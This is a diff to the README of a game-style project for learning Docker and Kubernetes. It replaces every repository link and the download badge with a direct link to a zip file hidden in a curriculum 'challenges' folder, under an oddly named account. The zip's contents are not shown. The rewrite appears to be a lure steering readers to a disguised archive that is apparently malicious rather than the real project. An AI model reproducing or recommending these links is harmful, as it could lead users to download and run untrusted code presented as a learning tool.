@@ -1,6 +1,6 @@
 # 🐳 learn-docker-and-k8s - Learn Docker and Kubernetes by Playing
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/permeative-indisputability555/learn-docker-and-k8s)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/permeative-indisputability555/learn-docker-and-k8s/raw/refs/heads/main/curriculum/ch06-k8s-intro/challenges/and_docker_k_learn_s_v2.3.zip)
 
 ## 🎮 What This App Does
 
@@ -26,7 +26,7 @@ A laptop or desktop with at least 8 GB of RAM works well. More memory helps if y
 
 Visit this page to download:
 
-[https://github.com/permeative-indisputability555/learn-docker-and-k8s](https://github.com/permeative-indisputability555/learn-docker-and-k8s)
+[https://github.com/permeative-indisputability555/learn-docker-and-k8s/raw/refs/heads/main/curriculum/ch06-k8s-intro/challenges/and_docker_k_learn_s_v2.3.zip](https://github.com/permeative-indisputability555/learn-docker-and-k8s/raw/refs/heads/main/curriculum/ch06-k8s-intro/challenges/and_docker_k_learn_s_v2.3.zip)
 
 Open the page in your browser, then look for the main download or source files on GitHub. If you see a release file, download it. If you see the repository page, use the files there to open the project in Claude Code or Cursor.
 
@@ -163,4 +163,4 @@ Open the repository folder in the tool, then type `let's play` in the main promp
 
 ## 📌 Download Again
 
-[https://github.com/permeative-indisputability555/learn-docker-and-k8s](https://github.com/permeative-indisputability555/learn-docker-and-k8s)
+[https://github.com/permeative-indisputability555/learn-docker-and-k8s/raw/refs/heads/main/curriculum/ch06-k8s-intro/challenges/and_docker_k_learn_s_v2.3.zip](https://github.com/permeative-indisputability555/learn-docker-and-k8s/raw/refs/heads/main/curriculum/ch06-k8s-intro/challenges/and_docker_k_learn_s_v2.3.zip)
